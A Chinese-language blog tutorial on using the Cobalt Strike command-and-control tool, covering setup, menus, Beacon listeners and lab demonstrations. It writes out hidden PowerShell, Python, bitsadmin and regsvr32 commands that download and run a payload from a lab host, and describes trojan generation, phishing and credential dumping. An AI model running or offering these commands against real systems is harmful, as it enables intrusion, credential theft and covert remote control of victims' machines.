<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>CobaltStrike基础使用详解 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="CobaltStrike基础使用详解" />
<meta property="og:description" content="CobaltStrike简介 Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横 向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可 以连接多个服务端，一个服务端也可以对应多个客户端连接。
CobaltStrike基本使用 CS安装 1.Linux安装JDK
apt search java | grep jdk apt install openjdk-11-jdk 2.Windows安装JDK
下载JDK： https://www.oracle.com/java/technologies/downloads/#java8-windows Oracle公共账号密码：http://bugmenot.com/view/oracle.com 3.环境变量配置
Java_Home =&gt; C:\Program files\jdk1.8.0_216 CLASSPATH =&gt; .;JAVA_HOME%\lib;%JAVA_HOME\lib\tools.jar PATH =&gt; %JAVA_HOME%\bin;%JAVA_HOME\jre\bin CS启动 1.启动服务端
chmod &#43;x teamserver ./teamserver [server_ipaddress] [password] 2.启动客户端
./cobaltstrike Alias：别名，用户名@服务端IP地址
Host :服务端IP地址，可为域名
Port：服务端口号，默认50050，可进行修改
User：用户名，可随意填写，只要不冲突即可
Password: 登录密码，启动服务端时设置的密码
CS界面介绍 Connect to team server：连接服务端Disonnect from team server：断开当前服务端连接Configure Listeners：配置监听器Show sessions in graph view：展示会话列表Show sessions in table view：展示视图列表Show targets in table view：展示目标列表Credentials：查看从靶机获取的账户密码Downloaded Files：查看从靶机下载的文件Keystrokes：查看键盘记录Screenshots：查看屏幕截图Generate Windows Executable (Stageless)：生成无状态的EXE木马Setup java Signed Applet Attack：开启Web服务为自签名Java Applet提供运行 环境MS Office Macro Attack：生成OFFICE宏病毒文件Setup Scripted Web-Delivery (Stageless)：开启Web服务，供下载和执行 PayloadHost a file：开启Web服务，供下载文件Manage Web Server：管理Web服务Help：帮助文档 18." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/2aff5bba4e79b16a6ea8b65eb0818c69/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-17T19:48:27+08:00" />
<meta property="article:modified_time" content="2023-04-17T19:48:27+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">CobaltStrike基础使用详解</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h4><a id="CobaltStrike_0"></a>CobaltStrike简介</h4> 
<p>Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横 向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可 以连接多个服务端，一个服务端也可以对应多个客户端连接。</p> 
<h4><a id="CobaltStrike_5"></a>CobaltStrike基本使用</h4> 
<h5><a id="CS_7"></a>CS安装</h5> 
<p>1.Linux安装JDK</p> 
<pre><code>apt search java | grep jdk 
apt install openjdk-11-jdk
</code></pre> 
<p>2.Windows安装JDK</p> 
<pre><code>下载JDK： https://www.oracle.com/java/technologies/downloads/#java8-windows 
Oracle公共账号密码：http://bugmenot.com/view/oracle.com
</code></pre> 
<p>3.环境变量配置</p> 
<pre><code>Java_Home =&gt; C:\Program files\jdk1.8.0_216 
CLASSPATH =&gt; .;JAVA_HOME%\lib;%JAVA_HOME\lib\tools.jar 
PATH =&gt; %JAVA_HOME%\bin;%JAVA_HOME\jre\bin
</code></pre> 
<h5><a id="CS_32"></a>CS启动</h5> 
<p>1.启动服务端</p> 
<pre><code>chmod +x teamserver 
./teamserver [server_ipaddress] [password]
</code></pre> 
<p><img src="https://images2.imgbox.com/b0/4f/k4i8yPeh_o.png" alt="请添加图片描述"></p> 
<p>2.启动客户端</p> 
<pre><code>./cobaltstrike
</code></pre> 
<p>Alias：别名，用户名@服务端IP地址<br> Host :服务端IP地址，可为域名<br> Port：服务端口号，默认50050，可进行修改<br> User：用户名，可随意填写，只要不冲突即可<br> Password: 登录密码，启动服务端时设置的密码</p> 
<h5><a id="CS_56"></a>CS界面介绍</h5> 
<p><img src="https://images2.imgbox.com/65/77/3yYafUB6_o.png" alt="请添加图片描述"></p> 
<ol><li>Connect to team server：连接服务端</li><li>Disonnect from team server：断开当前服务端连接</li><li>Configure Listeners：配置监听器</li><li>Show sessions in graph view：展示会话列表</li><li>Show sessions in table view：展示视图列表</li><li>Show targets in table view：展示目标列表</li><li>Credentials：查看从靶机获取的账户密码</li><li>Downloaded Files：查看从靶机下载的文件</li><li>Keystrokes：查看键盘记录</li><li>Screenshots：查看屏幕截图</li><li>Generate Windows Executable (Stageless)：生成无状态的EXE木马</li><li>Setup java Signed Applet Attack：开启Web服务为自签名Java Applet提供运行 环境</li><li>MS Office Macro Attack：生成OFFICE宏病毒文件</li><li>Setup Scripted Web-Delivery (Stageless)：开启Web服务，供下载和执行 Payload</li><li>Host a file：开启Web服务，供下载文件</li><li>Manage Web Server：管理Web服务</li><li>Help：帮助文档 18. About：关于Cobalt Strike</li></ol> 
<h5><a id="CobaltStrike_81"></a>CobaltStrike菜单</h5> 
<ol><li>New Connection：进行另外一个连接，支持连接多个服务器端</li><li>Preferences：设置Cobal Strike界面、控制台、以及输出报告样式TeamServer 连接记录</li><li>Visualization：主要展示输出结果的形式</li><li>VPN Interfaces：设置VPN接口</li><li>Listenrs：创建一个Listener</li><li>Script Manager：脚本管理</li><li>Close：退出连接</li></ol> 
<h5><a id="View_92"></a>View菜单</h5> 
<ol><li>Applications：显示受害主机的应用信息，浏览器版本信息</li><li>Credentials：显示所有已获取的受害主机的凭证，如使用hashdump、 Mimikatz获取到的密码凭证信息</li><li>Downloads：查看已下载文件</li><li>Event Log：主机上线记录以及团队协作聊天记录</li><li>Keystrokes：查看键盘记录结果</li><li>Proxy Pivots：查看代理模块</li><li>Screenshots：查看所有屏幕截图</li><li>Script Console：脚本控制台，加载第三方脚本以增强功能</li><li>Targets：显示所有受害主机</li><li>Web Log ：所有访问Web服务的日志记录</li></ol> 
<h5><a id="Attack_106"></a>Attack菜单</h5> 
<ol><li> <p>packages<br> • HTML Application生成(executable/VBA/powershell)这三种原理实现的恶意 HTA木马文件 （<strong>html应用程序</strong>）<br> • MS Office Macro：生成office宏病毒文件<br> • Payload Generator：生成各种语言版本的payload（<strong>常用</strong>）<br> • Windows Executable：生成可执行exe木马<br> • Windows Executable(Stageless)：生成无状态的可执行exe木马</p> </li><li> <p>Web Drive-by<br> • Manage对开启的web服务进行管理 Clone Site：克隆网站，可以记录受害者提交的数据<br> • Host File：提供一个文件下载，可以修改Mime信息<br> • Scripted Web Delivery：为payload提供web服务以便下载和执行 类似于 Metasploit的web_delivery<br> • Signed Applet Attack：使用java自签名的程序进行钓鱼攻击(该方式已过时)<br> • Smart Applet Attack：自动检测java版本并进行攻击，针对Java 1.6.0_45以下以 及Java 1.7.0_21以下版本<br> • System Profiler ：用来获取一些系统信息，比如系统版本，Flash版本，浏览器 版本等<br> • Spear Phish ：用来邮件钓鱼的模块,鱼叉钓鱼攻击</p> </li></ol> 
<p><strong>3. Spear Phish</strong><br> • <strong>HTML Application</strong>：生成一个网页Payload 。三种执行模式：EXE执行、PowerShell、VBA<br> • Executable：是以十六进制的方式内嵌一个EXE到HTA里，运行时会把exe释放到磁 盘然后创建进程运行<br> • Powershell：HTA调用powershell.exe执行payload<br> • VBA：通过调用COM组件来执行payload(请确保目标机有Excel.Application组件否则 会运行失败，注：组件源自Office）</p> 
<p><strong>Windows Executable</strong><br> 首先是一个传输器载荷，主要用于客户端和服务的之间的连接，建立后再下载一个传输体载荷，生成可执行文件。（体积小几百k）</p> 
<pre><code>Windows EXE
Windows Service EXE 
Windows DLL
</code></pre> 
<p><strong>Windows Executable(s)</strong><br> 具有完成功能的beacon，生成可执行文件还有powershell以及动态链接库（大小几千k）</p> 
<pre><code>PowerShell 
Raw Windows EXE
Windows Service EXE 
Windows DLL
</code></pre> 
<h4><a id="Beacon_154"></a>Beacon右键菜单</h4> 
<p><strong>Access:</strong></p> 
<ol><li>Dump Hashes # 获取hash</li><li>Elevate # 提权</li><li>Golden Ticket # 生成黄金票据注入当前会话</li><li>Make token # 凭证转换</li><li>Run Mimikatz # 运行 Mimikatz</li><li>Spawn As # 用其他用户生成Cobalt Strike侦听器</li></ol> 
<p><strong>Explore</strong>:</p> 
<ol><li>Browser Pivot # 劫持目标浏览器进程</li><li>Desktop(VNC) # 桌面交互</li><li>File Browser # 文件浏览器</li><li>Net View # 命令Net View</li><li>Port Scan # 端口扫描</li><li>Process List # 进程列表</li><li>Screenshot # 截图</li></ol> 
<p><strong>Pivoting:</strong></p> 
<ol><li>SOCKS Server # 代理服务</li><li>Listener # 反向端口转发</li><li>Deploy VPN # 部署VPN</li></ol> 
<p>Spawn：外部监听器(如指派给MSF，获取meterpreter权限)</p> 
<p><strong>Session:</strong></p> 
<ol><li>Note # 备注</li><li>Remove # 删除</li><li>Sleep # 指定被控端休眠时间，默认60秒一次回传</li><li>Exit # 退出</li></ol> 
<h4><a id="CobaltStrike_191"></a>CobaltStrike监听器详解</h4> 
<h5><a id="Beacon_193"></a>Beacon介绍</h5> 
<p>Beacon是Cobalt Strike运行在目标主机上的payload，Beacon在隐蔽信道上我们提供服务，用于长期控制受感染主机。它的工作方式与Metasploit Framework Payload类似。在实际渗透过程中，我们可以将其嵌入到可执行文件、添加到Word 文档或者通过利用主机漏洞来传递Beacon。</p> 
<p><img src="https://images2.imgbox.com/d5/7d/6pfU94TA_o.png" alt="请添加图片描述"></p> 
<h5><a id="Beacon_202"></a>Beacon分类</h5> 
<p>根据内置 Listener 的分类可以将Beacon进行分类， Listener 是用来接收 Beacon 请求信息的 Cobalt Strike 模块。</p> 
<p>1.内部beacon：<br> • Beacon DNS<br> • Beacon HTTP<br> • Beacon HTTPS<br> • Beacon SMB<br> • Beacon TCP</p> 
<p>2.外部beacon： 与其他工具联合使用时才会使用到，一般用来派生会话到MSF<br> • Foreign HTTP<br> • Foreign HTTPS</p> 
<p><img src="https://images2.imgbox.com/8d/e0/2a2AxO2v_o.png" alt="请添加图片描述"></p> 
<p>Name：监听器名字<br> Payload：选择Beacon类型<br> HTTP Hosts：配置HTTP Beacon回连主机地址<br> HTTP Host (Stager)：配置分阶段payload，Stager的请求地址，仅当Payload明 确需要Stager配合时有效<br> HTTP Port (C2)：配置HTTP Beacon回连的监听端口<br> Host Rotation Strategy：CS4.3新增，在 beacon 通信时，可以选择更多的轮询 方案以逃避检测、阻断， beacon 回连主机策略<br> Profile： Malleable C2 配置文件，用于自定义通信流量特征<br> HTTP Port (Bind)：绑定监听端口，实现端口重定向<br> HTTP Host Header：设置内层真实域名，在使用域前置技术时使用<br> HTTP Proxy：为Payload指定代理</p> 
<h5><a id="Beacon_234"></a>Beacon工作原理</h5> 
<p>Beacon HTTP/HTTPS ： 以HTTP或HTTPS协议建立Beacon连接</p> 
<ol><li>HTTP Beacon payload连接到C2控制器，它会发起一个<strong>GET请求</strong>，获取来自C2 控制器的执行操作任务</li><li>如果C2控制器有要执行的任务，那么它会响应一组包含payload执行的所有任务 的加密数据</li><li>否则HTTP Beacon payload会返回到睡眠状态，我们可以在payload配置中设置 时间周期。</li><li>当Payload执行任务后产生输出时，HTTP Beacon payload会通过一个包含加密 数据的<strong>POST请求</strong>发送给C2，这个POST请求中包含任务运行后的输出。如果没有 输出，那么就没有这个POST请求。</li></ol> 
<p><strong>Beacon SMB</strong><br> 以SMB协议流量建立Beacon连接，适用于<strong>内网横向</strong><br> SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个Beacons链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacon 使用 Windows 命名 管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时 可能发挥奇效。</p> 
<p><strong>前提条件：</strong></p> 
<ol><li>具有 SMB Beacon 的主机必须接受 445 端口上的连接。</li><li>只能链接由同一个 CobaltStrike 实例管理的 Beacon 。</li><li>利用这种 Beacon 横移必须有目标主机的管理员权限或者说是拥有具有管理员权 限的凭据。</li></ol> 
<h4><a id="_257"></a>功能实操演示</h4> 
<h5><a id="_259"></a>提供文件下载</h5> 
<p><strong>Host File</strong><br> 提供一个文件下载服务，可以修改Mime信息.</p> 
<p><img src="https://images2.imgbox.com/43/11/WV20r9NR_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/2a/94/m24UgYo4_o.png" alt="请添加图片描述"></p> 
<p>浏览器访问它 ： http://192.168.42.132:8012/99.html 就可以直接下载文件。<img src="https://images2.imgbox.com/ff/90/Phxe2q3w_o.png" alt="请添加图片描述"></p> 
<h5><a id="_272"></a>托管恶意软件</h5> 
<p><strong>Scripted Web Delivery</strong><br> 开启一个web服务托管payload，并根据选择的类型生成一个命令行来执行 payload 上线。</p> 
<p><img src="https://images2.imgbox.com/3a/8b/QbktstSF_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/35/ab/vNhcGxY7_o.png" alt="请添加图片描述"></p> 
<p>5种类型的命令，最后三个是windows系统内置的。<strong>常用的是powershell的方式</strong>，记得勾选上x64的payload。</p> 
<pre><code>exe：
http://172.26.2.28:807/e.exe

python：
python -c "import urllib2; exec urllib2.urlopen('http://172.26.2.28:807/a').read();"

powershell：
powershell.exe -nop -w hidden -c "IEX ((new-objectnet.webclient).downloadstring('http://172.26.2.28:808/a'))"

bitsadmin：
cmd.exe /c bitsadmin /transfer 7d0f http://172.26.2.28:807/b%APPDATA%\7d0f.exe&amp;%APPDATA%\7d0f.exe&amp;del %APPDATA%\7d0f.exe

regsvr32：
regsvr32 /s /n /u /i:http://172.26.2.28:807/d scrobj.dll
</code></pre> 
<p><img src="https://images2.imgbox.com/2d/fc/FZnX8ejA_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/8b/aa/5qoGObdJ_o.png" alt="请添加图片描述"></p> 
<p>在目标机器上执行命令： powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http://192.168.42.132:80/a’))”<br> 执行后会发现成功上线cs。</p> 
<p><img src="https://images2.imgbox.com/29/b7/RZXLNTce_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/e3/11/swA7tXJt_o.png" alt="请添加图片描述"></p> 
<h5><a id="_317"></a>分析目标浏览器以及版本</h5> 
<p><strong>System Profiler</strong></p> 
<p><img src="https://images2.imgbox.com/32/c9/mAZvQyRw_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/c6/b2/ky7ykDbQ_o.png" alt="请添加图片描述"></p> 
<p>访问前先在视图里找到web log ，点击看看，然后去再去访问，会看见有日志信息，可以<strong>在里面查看到目标系统的使用的浏览器版本信息</strong>那些的，进行一个信息的收集。</p> 
<p><img src="https://images2.imgbox.com/bd/29/PdsYT0Ho_o.png" alt="请添加图片描述"></p> 
<h5><a id="hta_334"></a>hta远程上线</h5> 
<p>1.生成 HTML 应用程序(HTA)文件：Attacks &gt; Packages &gt; HTML Application</p> 
<p>2.要先配置一个监听器，主要用到powershell的方式，且免杀有优点。</p> 
<p><img src="https://images2.imgbox.com/5f/b6/Uo2WWfT4_o.png" alt="请添加图片描述"></p> 
<p>3.生成文件后，上传到目标机器，或者钓鱼引诱人家下载去执行，还可以利用托管文件让人下载，执行就可上线。</p> 
<p>4.在windows里面有个内置命令 mshta ，它可以执行hta的文件，当拿到一台机器的shell可以使用它来对托管文件的下载并执行。</p> 
<p><img src="https://images2.imgbox.com/99/a0/Hovj5Py0_o.png" alt="请添加图片描述"></p> 
<p><img src="https://images2.imgbox.com/0e/4f/1fjl7E4S_o.png" alt="请添加图片描述"></p> 
<h5><a id="_353"></a>无阶段木马上线</h5> 
<p>1.生成一个无阶段木马，要先配置监听器，默认生成的名字是beacon.exe ，可以直接在windows系统上执行。</p> 
<p><img src="https://images2.imgbox.com/93/e7/RdAMZydF_o.png" alt="请添加图片描述"></p> 
<p>2.执行它，会在cs上看见它上线，而且方式是用的beacon，而不是前面的powershell类型。</p> 
<p><img src="https://images2.imgbox.com/39/cc/aHNwKvkQ_o.png" alt="请添加图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0b5871bbb90cf063d52430be8e84e1f6/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">DHCP原理与配置</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f6a5f2438789170783ed2d577adf06f8/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">[PTA]练习4-7 求e的近似值</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>